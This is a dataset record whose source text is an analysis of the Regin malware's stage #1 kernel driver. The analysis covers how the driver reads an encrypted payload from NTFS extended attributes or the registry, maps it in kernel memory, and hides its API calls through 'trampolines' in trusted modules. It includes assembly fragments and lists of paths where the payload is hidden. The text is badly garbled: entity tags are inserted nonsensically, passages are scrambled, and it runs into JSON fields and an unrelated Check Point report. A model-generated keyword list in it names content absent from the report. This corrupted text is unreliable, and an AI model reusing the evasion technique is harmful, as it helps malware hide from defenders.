[CARDINAL] 27 32 - bit samples of [ORG] Regin \u2019s stage # [MONEY] 1 component . We [ORDINAL] first extract and collect a set of high level information from these samples to obtain a general overview of their structure . Based on this overview , we propose using [CARDINAL] two distinct grouping criteria to facilitate working with these samples . A single sample is then selected and analysed in detail ; its functionalities are isolated and presented here , together with relevant portions of its code.1.1 sample statisticsOur analysis covers a collected set of [CARDINAL] 27 32 - bit [WORK_OF_ART] Portable [WORK_OF_ART] Executable ( [WORK_OF_ART] PE ) files for the [ORG] Microsoft [PRODUCT] Windows operating system . All 27 samples are device drivers , designed to work at the kernel level . Based on the code structure of the samples , they can be roughly categorized into [CARDINAL] two groups : y \u201c Pure \u201d \u2014 does not feature any extra code beside themalicious oney \u201c Augmented \u201d \u2014 the malware code is present incombination with code from a legitimate device driverSome \u201c augmented \u201d samples seem to be derived from [ORG] Microsoft device drivers , with modifications to drive the execution towards the malicious code . Of the [CARDINAL] 27 samples , [CARDINAL] 20 of them ( or 74 % ) are \u201c pure \u201d ; [CARDINAL] only [CARDINAL] 7 samples can be classified as are \u201c augmented \u201d . Despite the small amount of samples at our disposal , it is possible to speculate that the disproportion between the number of \u201c pure \u201d and \u201c augmented \u201d samples reflects the additional complexity associated with creating the \u201c augmented \u201d samples . Another possibility is that \u201c augmented \u201d samples represent a particular stage of development or have served a particular purpose , and for this reason they are fewer in number ; this suspicion might be confirmed by the compilation date as extracted from the samples \u2019 [ORG] PE header . Analysis of the resources also shows that the \u201c augmented \u201d binaries are masked as binaries for [EVENT] Windows [EVENT] NT [EVENT] 5.2.3790 , also known as Windows Server 2003 . This hints to the fact that the attackers might have used these samples to specifically target machines running this particular version of Windows . It also interesting to consider the filenames of the samples as they were observed in the wild or during submission for analysis . In [CARDINAL] 12 cases ( 44 % of samples ) , the decoy names used by the files was \u201c usbclass.sys \u201d . [ 1 ] This particular name was used only for \u201c pure \u201d samples ( though not all such samples used this name ) . It is our opinion that this particular name was selected to allay any suspicions on the victim \u2019s part , if the file was discovered . Following detailed analysis of a selected reference sample ( presented in later sections ) , we were able to group samples based on differences in their code from the analysed sample . We define the distance function between our reference sample and other samples as : d(sample)\u3016 : \u3016=|\u3016functions\u3016sample reference [ORDINAL] \u2229 functionssample ||\u3016functions\u3016sample\u3016reference |Using this metric , we determined there were [CARDINAL] three categories among the [CARDINAL] 27 samples at our disposal . A set of [CARDINAL] 13 samples out of [CARDINAL] 26 [ [CARDINAL] 2 ] , which was assigned the label \u201c variant # [MONEY] 1 \u201d , alongside the reference sample , were extremely close to the reference , with distances [PERCENT] between 89 % [PERCENT] and 100 % . [CARDINAL] 7 out of [CARDINAL] 26 samples ( labelled \u201c variant # [MONEY] 2 \u201d ) were very distant from the reference sample [ [CARDINAL] 3 ] , with a consistent distance of 2.63 % . Finally , the last 7 samples ( labelled \u201c variant # [MONEY] 3 \u201d ) showed distances [PERCENT] between 41 % [PERCENT] and 53 % from the reference sample . While samples belonging to \u201c variant # [MONEY] 2 \u201d or \u201c variant # [MONEY] 3 \u201d were not analyzed in detail , preliminary analysis shows that they all possess the same functionalities , but their code is notably different at the function level . A final observation is that all the \u201c augmented \u201d samples belong to \u201c variant # [MONEY] 1 \u201d , according to this classification method . The full data matrix regarding the samples is provided in Appendix A for the interested reader.2 . Malware analysisThis section presents a detailed analysis of a selected sample from the set of samples for Regin \u2019s stage # [MONEY] 1 , which later serves as a reference for further analysis of other [ORG] samples.1 There exists a small number of references to a [ORG] Logitech device driver with the name \u201c usbclass.sys \u201d . Were these references to be correct , it could be speculated that the malware authors may have wanted to use a name that would survive a simple investigation attempt done by , say , using an internet search engine.2Chart [CARDINAL] 1 : Flowchart of content retrieval logic2.1 Deployment and startupAt the time of writing , it is not known how the [ORG] Regin stage # 1 samples are deployed to the target system . Our analysis of the samples \u2019 system interactions showed no evidence to indicate that they are any different from other device drivers ; we therefore believe that these samples are installed , registered and invoked as with any other device driver.2.2 sample selectionThe analysis in this section focuses on the sample with MD5 for [CARDINAL] two reasons : [ORDINAL] first , the sample was among the [ORDINAL] first fewwe retrieved , and [ORDINAL] second , it was the only \u201c pure \u201d sample in that particular set . A \u201c pure \u201d sample has the advantage of being self - contained , smaller in size and independent from any other code.2.3 Content retrievalAlmost immediately after receiving control , the malware \u2019s code will attempt to locate its payload from the already infected system . The malware will scan selected locations in both the file system and the registry . These locations are hardcoded inside the binary itself under a layer of simple encryption . The logic for content retrieval can be represented by a simplified flowchart ( [ORG] Chart 1).2 The total number of samples is [CARDINAL] 26 because the reference sample has been excluded.3 It is clear that d ( sample reference ) = [CARDINAL] 1.3Image [CARDINAL] 1 : Content decryption loopImage 2 : Payload verification code2.4 retrieval from the file system ( extended attributes)content is simply the value of the provided key / value - name combination . Regin \u2019s stage # [MONEY] 1 component relies on the concept of \u2018 Extended Attributes \u2019 to store its payload on the file - system . [ORG] Extended [ORG] Attributes are a list of name - value pairs that can be associated to [ORG] New [ORG] Technology [ORG] File [ORG] System ( NTFS ) files and directories . The malware retrieves the list of extended attributes associated with the provided full path to a directory or file . This list is then iterated and each element is inspected . The malware expects to retrieve the content from extended attributes named as \u201c _ \u201d . If that condition is met , the value is then extracted . It should be noted that the content may be split between extended attributes belonging to [CARDINAL] two different [ORG] NTFS objects . An example file - system location is the following:<WINDOWS>\\CursorsThe use of [ORG] Extended [ORG] Attributes was not observed in malware until the recent emergence of the [ORG] ZeroAccess rootkit [ [CARDINAL] 4 ] . As the [ORG] Regin threat appears to have emerged earlier than [ORG] ZeroAccess however , we are convinced that significant skills , knowledge and resources were available to the developers of Regin to enable earlier use of this unusual technique.2.5 retrieval from the registryIf Regin \u2019s stage # [MONEY] 1 is unable to retrieve payload content from the file - system , the malware will turn its attention to the registry . Regin \u2019s stage # 1 malware samples contain a hardcoded registry path and value name to be used as a fall- back location for content retrieval . In this case , the soughtAn example registry location is:\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\RestoreList : VideoBaseIf both content retrieval attempts are unsuccessful , the malware will not perform any additional operation until its next invocation , when it will again attempt to retrieve content from either the file - system or the registry.2.6 DecryptionThe encryption used to protect the content in the file system or registry is a XOR based algorithm , specific to this malware family . Regin \u2019s stage # 1 body contains the key needed for payload decryption . The code for the payload \u2019s decryption routine is presented in [ORG] Image [ORG] 1.After decryption , the malware quickly verifies the payload is correct , in order to avoid attempting to map something for execution when it is obviously invalid ( [ORG] Image [ORG] 2).2.7 Content mappingOnce the payload is in clear text , [ORG] Regin \u2019s stage # [MONEY] 1 proceeds to map it so that it can be executed . The mapping process follows the logic of the operating system \u2019s PE loader . Regin \u2019s stage # 1 [ORG] PE loader is quite comprehensive ; considering the suspected age of the threat , the generic nature of the [ORG] PE loader and the fact that the PE loading happens completely in kernel mode , we can speculate that the authors of this threat are skilled and well - funded.4 Symantec Response blog ; [PERSON] Mircea [PERSON] Ciubotariu ; [GPE] Trojan . Zeroaccess . C Hidden in NTFS EA ; published [CARDINAL] 14 Aug 2012;url 3 : Code recovered for the [PERSON] QuickPeParse function2.8 the Quickpeparse functionOf particular interest is a specific helper function that is widely used by [ORG] Regin \u2019s stage # [MONEY] 1 in association with [ORG] PE manipulation.simplifying the code and avoiding dangerous mistakes . This is , again , possibly additional confirmation of the attacker \u2019s skills.2.9 [PRODUCT] Header and sectionsThe helper function quickly verifies the validity of a [ORG] PE file , while at the same time recovering information ( Image 3 ) useful to anyone willing to load or programmatically process a [ORG] PE file . Given the number of times Regin \u2019s stage # [MONEY] 1 needs to retrieve [ORG] PE - related information , this subroutine is a great help inThis part of the loading process is performed in a fairly standard way . Regin \u2019s stage # [MONEY] 1 begins the loading process by verifying that its payload is a valid [ORG] PE file . If this verification is successful , the malware retrieves the value of the SizeOfImage field from the OptionalHeader of the [ORG] PE file , then allocates a number of bytes equivalent to this value.5Image [CARDINAL] 4 : Calculating the deltaImage 5 : Missing replacements for mem * functionsThe payload will be mapped to this memory region . Before proceeding any further , Regin \u2019s stage # [MONEY] 1 calculates the delta ( Image 4 ) between the address of the memory region it allocated for the memory mapped image and the preferred [ORG] ImageBase retrieved from the [ORG] OptionalHeader . This information will be used later during the mapping process , in case relocations need to be processed . With these operations completed , the headers are mapped [ORDINAL] first , followed sequentially by each of the [ORG] PE file sections . This process is relatively straightforward . It is to be appreciated that the majority of the operations described above rely at some level on [ORG] QuickPeParse \u2019s results . On another note , in this section of the code we begin to see references to missing replacements for mem * functions . The absence of the mem * replacements does not affect the malware \u2019s ability to proceed with the execution , as the code falls back to standard API functions ( Image 5 ) . Such code constructs are encountered extensively throughout the remainder of the code . Our opinion on this matter is that the replacement functions would provide augmented logging when dealing with memory operations ; their absence is possibly the result of conditional compilation . Such an explanation would further the belief that the authors of this malware are experienced [PERSON] developers.2.10 imports & trampolinespieces of code , eventually triggering the requested external subroutine before finally returning to the payload . Before getting into details , it is important to have an idea of how the trampolines work from a high - level perspective . A trampoline transition can be summarized as follows:1 . Payload invokes \u201c resolved \u201d external subroutine [CARDINAL] 2 . Trampoline code receives controla . [PERSON] Trampoline code retrieves the previously - resolved real address of the external subroutineb . Trampoline invokes the pre - API call code3 . Pre - API call code prepares the environment to makethe function call return to trusted location inside trusted modulea . Pre - API call code invokes the externalsubroutine4 . External subroutine performs its dutya . External subroutine returns5 . Execution lands in appropriate part of trustedmodule6 . Jump to post - API call code is executed [CARDINAL] 7 . Post - API call code receives controla . Post - API call code restores the environment forpayloadb . Post - API call code transfers control back topayload , as would normally happen after a call to an external subroutine8 . Payload continues its operationsImport resolution is the crucial part for achieving Regin stage # [MONEY] 1 \u2019s goal of hiding the originator of system calls from external observers . The loader will correctly resolve the address of imported functions , but will embed these addresses in so - called \u2018 trampoline \u2019 code . Addresses to the trampolines are instead added to [ORG] the [ORG] Import [ORG] Address [ORG] Table ( IAT ) . From there , the execution will traverse differentIn the following subsections we will discuss the details of how the malware retrieves and pieces together all the information required to produce and install the trampolines . Appendix B contains a diagram detailing a complete transition between the payload and an external module exporting a function.62.10.1 embedded code templatesThe stage # 1 malware uses predefined code for pre - API - call and post - API - call operations . This code is embedded in the binary and is almost ready for use , but it requires some customization to account for differences when it comes to memory addresses . The malware is aware of the start address of both pieces of code inside its own body , and has a rough idea of the size of the [CARDINAL] two code portions . The builder code contains wrong values for the size of both templates . This is most likely a remnant of a previous code version that contained templates that were bigger . With this information , the malware scans those sections of code looking for specific DWORDs that mark locations that need customization . As an example , we report a screenshot of the post - API- call code ( Image 6 ) . The value of [CARDINAL] 0x99119911 as the [ORDINAL] second operand of the last instruction in this code portion is a placeholder that acts as a marker for the builder code . The offset of the values needing customization are marked by the values : y pre - API - call code : \u25ca 0x66116611 \u25ca 0x77117711 \u25ca 0x88118811y post - API - call code : \u25ca 0x99119911Image 6 : Post - API - call codeThe addresses of such markers relative to the beginning of the owner code portion are recorded for later use . After all the information is recorded , [ORG] Regin \u2019s stage # [MONEY] 1 copies both the pre - API - call and the post - API - call code portions to newly allocated memory regions.2.10.2 locating a safe location inside a trusted moduleFor the trampolines to be successful , a safe location inside a trusted kernel module needs to be found . After the trampolines are in place , the affected module will be the one that is seen and \u201c blamed \u201d by an external observer every time the payload executes a call to an external subroutine . To find this location , Regin \u2019s stage # [MONEY] 1 scans all the sections that are executable and non pageable from a set of trusted modules . This set of modules includes : y NTOSKRNL.EXE y HAL.dll y Disk.sys y Atapi.sysThese memory regions are scanned for a specific set of bytes . The sought after combinations are listed below , together with their assembly representation.y 0xFF , 0x26 : jmp dword ptr [ esi ] y 0xFF , 0x27 : jmp dword ptr [ edi ] y 0xFF , 0x66 : jmp dword ptr [ esi+bb ] y 0xFF , 0x67 : jmp dword ptr [ edi+bb ] y 0xFF , 0xA6 : jmp dword ptr [ esi+dddddddd ] y 0xFF , 0xA7 : jmp dword ptr [ edi+dddddddd ] y 0xFF , 0xE6 : jmp esi y 0xFF , 0xE7 : jmp ediThe assembler representations make the malware \u2019s purpose quite clear . The malware will arrange for the system call to return to this particular location inside a trusted module , fooling any external observer who may be monitoring the return address to identify the module originating the call to the external subroutine . Executing the code at this location will make the CPU execute the jump operation , which will eventually lead back to the payload \u2019s code . If any of the [CARDINAL] two bytes sequences presented above is found in the code of a trusted module , and if the surrounding code passes further safety checks , its address is recorded . Depending on the specific byte combination found , additional information may be retrieved or calculated ; for example , in the case of a jmp dword ptr [ edi+xxxxxxxx ] , the immediate part of the operand is retrieved for calculating the delta between that value and the location containing the address of the post - API - call . The calculated delta value will be assigned to the [ORG] EDI register so that the execution will flow smoothly.7Image [CARDINAL] 7 : Trampoline memory allocationIf none of these sequences are found , the search continues in other sections and trusted modules . If no suitable location is available , Regin \u2019s stage # [MONEY] 1 will simply terminate its execution.2.10.3 Code template customizationOnce the safe location in a trusted module has been located and its address and type retrieved , Regin \u2019s stage # [MONEY] 1 can customize the copies of the pre- and post - API - call code templates . Each of the values is customized as follows : y 0x66116611 : delta value to be applied to ESI / [ORG] EDI [ORG] register so that the jump instruction at the safe location will lead the execution back to the post - API - call code y 0x77117711 : address of the safe jump location y 0x88118811 : nothing , used only as an end marker y [CARDINAL] 0x99119911 : not specifically replaced , but parts of it areoverwritten with the address of post - API - call code if the safe location involves an indirect jump2.10.4 trampolinesTrampolines are the mechanism that Regin \u2019s stage # [MONEY] 1 uses to reroute the execution through several pieces of code every time the payload executes a call to an external function . There exists a trampoline for each individual imported function , and the trampolines are stored sequentially in memory and accessed as an array . Each trampoline is constructed from the following template : y d2d2d2d2 : replaced with the offset of the pre - API - call code segment , relative to the instruction after the jmpDuring import resolution , each item to resolve is fetched and its address retrieved . The address is then used to fill a trampoline as described above . Finally , the address of the trampoline is added to the IAT of the module being mapped in place of the resolved address . Please note that , as is logical , this process is only executed for symbols whose address lies in a section that is flagged as executable . Other symbols are not protected by trampolines and their addresses are added directly to the IAT.The described trampoline mechanism clearly provides transparent protection to [ORG] the [ORG] payload.2.11 [ORG] the [ORG] Codeprotection structureThis structure links together all the pieces involved with the protection of the payload . It is added , for example , to the payload \u2019s data directory information and it is used for most of the computations performed by [ORG] Regin \u2019s stage # [MONEY] 1 . The structure is defined as follows : Image [CARDINAL] 8 : CodeProtection structuremov eax , d1d1d1d1jmp $ + d2d2d2d22.12 relocationsThe values \u201c d1d1d1d1 \u201d and \u201c d2d2d2d2 \u201d are placeholders that will be replaced during actual import resolution with the relevant information . In particular , the [CARDINAL] two values will be replaced with the following information : y d1d1d1d1 : replaced with the address of the external function from the [ORDINAL] third party module ( for example : NTOSKRNL.EXE!memcpy)The next step of the payload loading process is for the malware to process the possible relocations of the mapped payload . To carry out this operation , the dedicated code needs to process the base relocation table for the payload . Additionally , it makes use of the previously calculated delta between the current image base and the preferred image loading address.8Image [CARDINAL] 9 : Scanning the payload \u2019s DATA_DIRECTORIESThe [ORG] PE loader supports [CARDINAL] only [CARDINAL] two specific base relocation types , IMAGE_REL_BASED_HIGHLOW and IMAGE_REL _ BASED_DIR64 . However , this level of support is enough to guarantee the loading of binaries produced by recent toolchains . As a matter of fact , the loader \u2019s support of the relocation type IMAGE_REL_BASED_DIR64 gives us the firsts hint that a [CARDINAL] 64 - bit version of the Regin framework may exist , in combination with [CARDINAL] 64 - bit additional stages.2.13 Finalizing the loading processAs the final step in the loading process , the malware scans the payload \u2019s DATA_DIRECTORIES to perform a final modification to the mapped image . The modification consists of setting the [ORG] VirtualAddress of the selected DATA_DIRECTORY to the address of the previously mentioned [PRODUCT] CodeInjection structure . Additionally , the [PERSON] Size field of the selected DATA_DIRECTORY is set to a9special value , [CARDINAL] 0xFEDCBAFE ( renamed MALWARE_MARKER _ DATA_DIR_SIZE in Image 9).3 . ConClUsionsA suitable DATA_DIRECTORY is one which satisfies the following conditions : y The particular data directory is not in use(VirtualAddress and [PERSON] Size must be 0)y The directory should not be among the followingdirectories : [ORG] \u25ca [ORG] IMPORT [ORG] ADDRESS [ORG] TABLE ( [ORG] IAT ) \u25ca DELAY - LOAD IMPORT TABLEIt is clear that the malware selects the data directory with special care , specifically to avoid interference with interactions between the mapped payload and its [PERSON] dependencies.2.14 invocation of stage # 2With the payload fully mapped into memory and the trampoline mechanism set up to mask the malware \u2019s access to external subroutines , [ORG] Regin \u2019s stage # [MONEY] 1 is ready to transfer control to the next stage . This is done by calculating the address of stage # [MONEY] 2 \u2019s entry point and calling that location . Our analysis of the Regin \u2019s stage # [MONEY] 1 , as detailed in this document , shows that this component of the Regin framework is designed to retrieve an additional payload ( stage # [MONEY] 2 ) from an already compromised system , map it into kernel memory and execute it . During the loading process , Regin \u2019s stage # [MONEY] 1 will hide the payload \u2019s invocations of function exported by other modules using an unusual \u2018 trampoline \u2019 mechanism . In this way , the malware manages to effectively fool an external observer into thinking that calls to API functions are being performed by [CARDINAL] one of a set of \u2018 trusted \u2019 modules , thereby allaying suspicion of the payload \u2019s activities . The utilitarian nature of the malware makes it obvious that this is a support module , designed to hide the presence of an additional stage . Attempting attribution based on this single component is particularly challenging , as Regin \u2019s stage # [MONEY] 1 is purely a support module , with very little content other than executable code . In the case of the \u201c augmented \u201d samples , the benign device driver used as a base offers little to nothing in terms of information that could help identifying the author(s).That said , based on the code structure , we suspect that Regin \u2019s developers may be experienced and skilled . Statistical analysis of the [CARDINAL] 27 samples in our collection suggest that the [CARDINAL] three different types of stage # 1 samples we identified may have been the product of iterative development . The fact that the malware supports even [EVENT] Windows [EVENT] NT4 targets suggests that this malware is designed to work against a wide set of targets , each running different versions of the Windows operating system in their environment . We believe however that at some point the attackers directed their efforts towards machines running [EVENT] Windows [EVENT] NT Class\\{9B9A8ADB-8864 - 4BC4 - 8AD5 - B17DFDBB9F58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ RestoreList\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{9B9A8ADB-8864 - 4BC4 - 8AD5 - B17DFDBB9F58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ SessionClassClassClassClassClassClassClassClassClassClassClassClassClassClass < WINDOWS><WINDOWS>\\fonts < WINDOWS>\\security < WINDOWS > Temp < WINDOWS>\\repair < WINDOWS>\\msagent < WINDOWS><WINDOWS>\\fonts < WINDOWS>\\msapps < WINDOWS>\\Help < WINDOWS><WINDOWS>\\fonts < WINDOWS>\\msagent < WINDOWS>\\msagent\\chars < WINDOWS>\\msapps < WINDOWS>\\Help < WINDOWS><WINDOWS>\\fonts < WINDOWS><WINDOWS>\\fonts < WINDOWS>\\security < WINDOWS>\\Temp < WINDOWS>\\msagent < WINDOWS>\\msagent\\chars < WINDOWS>\\Temp < WINDOWS>\\inf < WINDOWS><WINDOWS>\\fontsVideoBase < WINDOWS>\\Cursors < WINDOWS>\\fontsClassClassClassClassClassClassClassClassClass < WINDOWS><WINDOWS>\\fonts < WINDOWS><WINDOWS>\\fonts < WINDOWS><WINDOWS>\\fonts < WINDOWS><WINDOWS>\\fonts < WINDOWS><WINDOWS>\\fonts < WINDOWS><WINDOWS>\\fonts < WINDOWS><WINDOWS>\\fonts < WINDOWS><WINDOWS>\\fonts < WINDOWS><WINDOWS>\\fonts{5D42A36B-12C4- DE7C-4BD1- 0612BD1CF324}<WINDOWS>\\Spool\\ Printers < [GPE] SYSTEM>\\CertSrv\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ Class\\{4F20E605 - 9452 - 4787 - B793 - D0204917CA58}\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\ mov ecx , esp sub ecx,[ebp+0x8 ] sub ecx,0x4 mov esp , ebp add esp,0xc add esp , ecx jmp edx ; Jump backOff post - api - call codeTRAMPOLINESmov eax , off NTOSKRNL.EXE!MEMCPY jmp pre - api - call codemov eax , off NTOSKRNL.EXE!MEMSET jmp pre - api - call codepre - api - call code : cmp esp , ebp mov esi , esp add esi,0xc push ebp push dword [CARDINAL] 0x0 mov ebx , esp mov ecx , ebp sub ecx , esi cmp ecx,0x4 mov eax,0xf imul eax , eax,0x4 cmp eax , ecx jnl [CARDINAL] 0x2302d mov ecx , eax mov [PERSON] edx,0x0 mov eax , ecx mov ebx,0x4 push dword [CARDINAL] 0x0 cmp eax,0x0 jnz [CARDINAL] 0x2303b add esp , ecx mov ebp , esp mov edi , esp sub edi , ecx mov esp , edi rep movsb mov [ ebx],esp mov ecx,[ebx-0x4 ] mov edx,[ebx-0x8 ] mov dword [ ebx-0x4],0x0 mov dword [ ebx-0x8],0x0SAFE_MODULE!SAFE_LOCATION : ; Indirect jump to ; of post - api - call jmp [ edi-0x78740008 ] ; NTOSKRNL.EXE!MEMSET : ret ; Change the original return address ; to the selected jump instruction in ; the safe module mov dword [ esp],SAFE_MODULE!SAFE_LOCATION ; Apply the correct [ORG] DELTA to the ; required register to satisfy the ; operand immediate at safe location mov edi , [ORG] DELTA jmp eax ; [GPE] NTOKRNL.EXE!MEMSET14", "generated_text": "a set; 32-bit samples; Regin; stage # 1; NT 4.0; the malware; a support module; the Windows operating system; the sample; content retrieval; Retrieval; the registry; the code; Modular; code; Embedded code templates; Embedded code templates; the threat actor; the malware; the use; the trampoline technique; code reuse; the miner; destination; the injected code; the program; the malware; infrastructure; the RAT; the attack; note; the RAT; capabilities; persistence; the first stage; enabling; the RAR; the attacker; the first server; name; the RAR; IP; This analysis; the main target; a Linux-based server; Encrypted Content; RAR; a user; Microsoft; infrastructure; OT; the first stage; the RAT; first stages; port; espionage; a model; the malware; persistence.", "ref_text": "<START-1>The document analyzes the first stage malware component of Regin, a complex cyberespionage threat. Stage 1 is designed to retrieve and load an encrypted payload (stage 2) from an already compromised system and make it harder to detect. Analysis of 27 samples shows stage 1 targets Windows, supports NT 4.0 and up, and samples fall into \"pure\" or \"augmented\" categories. The malware retrieves the payload from extended file attributes or the registry if that fails. It decrypts the payload using an XOR algorithm. Stage 1 uses an unusual \"trampoline\" technique to hide the payload's calls to external functions. It resolves imports but redirects calls through chunks of code that mask the origin of API calls. This fools monitoring tools into thinking calls come from trusted modules. The malware maps the payload into memory like a PE loader, processes relocations, and masks certain data directories. It then transfers control to stage 2. The report concludes stage 1 is purely support code to hide additional components, but shows the developers are skilled coders with significant resources. Indicators of compromise, code examples demonstrating the trampoline technique, and other technical details are provided. The author speculates there may be a 64-bit version based on supported relocation types. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5068870523415977, "gpt3/lexical/rouge_rouge2": 0.12742382271468145, "gpt3/lexical/rouge_rougeL": 0.25344352617079885, "gpt3/lexical/rouge_rougeLsum": 0.25344352617079885, "gpt3_generated_text": ["This article provides an analysis of a set of 32-bit samples of the Regin malware's stage #1 component. The malware serves as a support module to facilitate the operations of stage #2 and make it harder to detect. Stage #1 targets the Windows platform and supports various versions of the operating system, starting with Windows NT 4.0. The samples can be classified into \"pure\" samples that only contain malicious code and \"augmented\" samples that include malware code in combination with a legitimate device driver. The article focuses on the technical aspects of the malware, including deployment and startup, sample selection, content retrieval, decryption, content mapping, code protection, imports, and trampolines. The analysis reveals the sophistication of the import resolution process, which uses the \"trampoline\" technique to mask the payload's access to API functions. The article concludes that stage #1 of Regin has played a crucial role in ensuring long-term persistence in attacks."]}, {"split_name": "val", "sample_id": "val_112", "prompt_text": "Extract the keywords: [CARDINAL] 8/16/2021Indra \u2014 Hackers Behind Recent Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchIndra \u2014 Hackers Behind Recent Attacks on [DATE] Iranresearch.checkpoint.com/2021/indra-hackers-behind-recent-attacks-on-iranAugust 14 , [DATE] 2021August 14 , [DATE] 2021IntroductionThese [DATE] days , when we think of nation - state level damage , we immediately think of the nation - state level actor that must be responsible for it . While most attacks against a nation \u2019s sensitive networks are indeed the work of other governments , the truth is that there is no magic shield that prevents a non - state sponsored entity from creating the same kind of havoc , and harming critical infrastructure in order to make a statement . In this piece , we present an analysis of a successful politically motivated attack on [NORP] Iranian infrastructure that is suspected to be carried by a non - state sponsored actor . This specific attack happened to be directed at [GPE] Iran , but it could as easily have happened in [GPE] New [GPE] York or [GPE] Berlin . We \u2019ll look at some of the technical details and expose the actor behind the attack \u2014 thereby linking it to several other politically motivated attacks from [DATE] earlier [DATE] years . Key FindingsOn [DATE] July [DATE] 9th [DATE] and [DATE] 10th , [DATE] 2021 [NORP] Iranian Railways and [ORG] the [ORG] Ministry [ORG] of [ORG] Roads [ORG] and [ORG] Urban [ORG] Development systems became the subject of targeted cyber attacks . [ORG] Check [ORG] Point [ORG] Research investigated these attacks and found multiple evidence that these attacks heavily rely on the attacker \u2019s previous knowledge and reconnaissance of the targeted networks . The attacks on [GPE] Iran were found to be tactically and technically similar to previous activity against multiple private companies in [GPE] Syria which was carried at least since [DATE] 2019 . We were able to tie this activity to a threat group that identify themselves as regime opposition group , named [ORG] Indra.url \u2014 [ORG] Hackers [ORG] Behind [ORG] Recent [ORG] Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchDuring these years , the attackers developed and deployed within victims \u2019 networks [CARDINAL] at [CARDINAL] least [CARDINAL] 3 different versions of the wiper dubbed [PERSON] Meteor , Stardust , and Comet . Judging by the quality of the tools , their modus operandi , and their presence on social media , we find it unlikely that [PERSON] Indra is operated by a nation - state actor . A technical analysis of the tools , as well as the TTPs used by the underlying actor , are thoroughly described in this article . We share with the public [PERSON] Yara rules and a full list of indicators of compromise . On Friday , [DATE] July [DATE] 9th , [GPE] Iran \u2019s railway infrastructure came under cyber - attack . According to [NORP] Iranian news reports , hackers displayed messages about train delays or cancellations on information boards at stations across the country , and urged passengers to call a certain phone number for further information . This number apparently belongs to the office of the country \u2019s supreme leader , [PERSON] Ayatollah [PERSON] Ali [PERSON] Khamenei . \u201cLong delays due to cyber attacks . More information : [CARDINAL] 64411 \u201d message containing the [ORG] Supreme [ORG] Leader officenumber displayed on [GPE] Iran \u2019s railways \u2019 stations boards . Image published by the [NORP] media.url \u2014 [ORG] Hackers [ORG] Behind [ORG] Recent [ORG] Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchThe very [DATE] next [DATE] day , [DATE] July [DATE] 10th , websites of [GPE] Iran \u2019s [ORG] Ministry [ORG] of [ORG] Roads [ORG] and [ORG] Urbanization reportedly went out of service after another \u201c cyber - disruption \u201d . [NORP] Iranian social media spread the photos of a monitor of [CARDINAL] one of the hacked computers , where the attackers took responsibility for both consecutive attacks . \u201cWe attacked the computer systems of [ORG] the [ORG] Railway [ORG] Company and [ORG] the [ORG] Ministry [ORG] of [ORG] Roadsand [ORG] Urban [ORG] Development \u201d . The message left by attackers on hacked machinesA few days later , [NORP] Iranian cybersecurity company [PERSON] Amnpardaz [PERSON] Software published a short technical analysis of a piece of malware supposedly related to these attacks , dubbed [GPE] Trojan . Win32.BreakWin . Based on the information published , [ORG] Check [ORG] Point [ORG] Research [ORG] Team retrieved the files from publicly available resources and conducted a thorough investigation of them . The findings shared in this report were reviewed and evaluated by journalists and fellow researchers from other security vendors . During this time , [ORG] 